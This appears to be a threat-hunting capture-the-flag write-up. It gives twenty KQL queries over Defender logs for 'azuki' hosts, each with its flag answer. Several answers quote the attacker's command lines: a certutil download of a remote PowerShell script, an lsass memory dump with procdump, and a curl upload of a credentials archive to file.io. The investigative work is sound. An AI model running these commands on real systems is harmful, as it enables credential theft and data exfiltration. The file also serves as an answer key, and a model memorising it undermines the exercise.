```
//Flag 1
DeviceLogonEvents
| where DeviceName contains "azuki" 
| where Timestamp between (datetime(2025-11-20) ..datetime(2025-12-05))
| where ActionType == "LogonSuccess"
| project Timestamp, AccountName, RemoteIP, DeviceName
| sort by Timestamp asc 
// Flag 1 = 159.26.106.2
```
```
// Flag 2
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-05))
| where FileName == "mstsc.exe"
// Flag 2 interim answer is ip 10.1.0.108 - then go to part 2 below
```
```DeviceLogonEvents
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-05))
| where RemoteIP == "10.1.0.108"
| project Timestamp, DeviceId, DeviceName
| sort by Timestamp asc 
// Flag 2 = azuki-fileserver01
```
```
// Flag 3 
DeviceLogonEvents
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-05))
| where RemoteIP == "10.1.0.108"
| project Timestamp, DeviceId, DeviceName, AccountName
| sort by Timestamp asc 
// Flag 3 = fileadmin
```
```
// Flag 4
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-11-26))
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "view"
| project Timestamp, ProcessCommandLine, FileName
| sort by Timestamp asc 
// Flag 4 = net share
```
```
// Flag 5
DeviceProcessEvents
| where Timestamp > datetime(2025-11-22T00:00:00Z) and Timestamp < datetime(2025-11-26T00:00:00Z)
| where DeviceName contains "azuki"
| where ProcessCommandLine has "\\\\" 
| where ProcessCommandLine contains "view"
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp asc
// Flag 5 = "net.exe" view \\10.1.0.188 
```

```
// Flag 6
DeviceProcessEvents
| where DeviceName startswith "azuki"
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-10))
| where FileName endswith "whoami.exe"
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by DeviceName asc
// Flag 6 = "whoami.exe" /all
```
```
// Flag 7 
DeviceProcessEvents
| where DeviceName startswith "azuki"
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-10))
| where FileName =~ "ipconfig.exe"
| where ProcessCommandLine has "/all"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
// Flag 7 = "ipconfig.exe" /all 
```
```
// Flag 8
DeviceProcessEvents
| where DeviceName startswith "azuki"
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-10))
| where FileName =~ "attrib.exe"
| where ProcessCommandLine has_any ("+s", "+h")
| where ProcessCommandLine has_any ("+s +h", "+h +s")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp desc
// Flag 8 = "attrib.exe" +h +s C:\Windows\Logs\CBS
```
```
// Flag 9 - same KQL as above
// Flag 9 = C:\Windows\Logs\CBS
```
```
// Flag 10 
DeviceProcessEvents
| where DeviceName startswith "azuki"
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-10))
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("-urlcache", "-split", "-f")
| where ProcessCommandLine has ".ps1"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
// Flag 10 = "certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
```

```
// Flag 11
DeviceFileEvents
| where DeviceName startswith "azuki"
| where Timestamp between (datetime(2025-11-22) ..datetime(2025-12-10))
| where FileName endswith ".csv"
// Flag 11 = IT-Admin-Passwords.csv
```
```
// Flag 12
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName has_any (
    "robocopy.exe",
    "xcopy.exe", 
    "copy.exe",
    "move.exe",
    "forfiles.exe"
)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp desc
// Flag 12 = "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
```

```
//Flag 13 
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-20) .. datetime(2025-12-10))
| where DeviceName contains "azuki"
| where FileName contains "tar.exe" 
//| where ProcessCommandLine contains "it-admin"
| project Timestamp, ProcessCommandLine, FileName, InitiatingProcessFileName
| order by Timestamp asc
// Flag 13 = "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin . 
```

```
//Flag 14
DeviceFileEvents
| where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
| where FolderPath contains "CBS"
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
// Flag 14 = pd.exe
```

```
// Flag 15
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "pd.exe"
// Flag 15= 
//"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
```

```
// Flag 16
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-20) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "curl"
| project Timestamp, FileName, ProcessCommandLine
// Flag 16 = "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
```

```
//Flag 17 
// Same KQL query as Flag 16
// Flag 17 = file.ioAlertEvidence
```

```
//Flag 18 
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
//| where ActionType contains "RegistryValueset" or ActionType contains "RegistryValueset"
| distinct RegistryValueName
// Flag 18 = FileShareSync
```

```
// Flag 19
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
//| where ActionType contains "RegistryValueset" or ActionType contains "RegistryValueset"
| where RegistryValueName == "FileShareSync"
// Flag 19 = svchost.ps1
```

```
// Flag 20 
DeviceFileEvents
| where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName endswith "ConsoleHost_history.txt"
| where FolderPath contains @"\Microsoft\Windows\PowerShell\PSReadLine\"
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, FolderPath
// Flag 20 = 
//ConsoleHost_history.txt
